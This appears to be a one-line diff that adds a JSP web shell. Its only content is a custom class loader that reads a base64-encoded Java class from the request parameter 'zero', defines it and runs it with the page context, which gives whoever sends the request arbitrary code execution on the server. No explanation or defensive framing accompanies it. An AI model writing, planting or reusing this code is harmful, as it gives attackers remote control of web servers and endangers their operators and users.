@@ -1,0 +1,1 @@
+<%!class IKMS extends ClassLoader{ IKMS(ClassLoader DMZP){ super(DMZP); }public Class g(byte []b){ return super.defineClass(b,0,b.length); }}%><% String cls=request.getParameter("zero");if(cls!=null){ new IKMS(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(cls)).newInstance().equals(pageContext); }%>
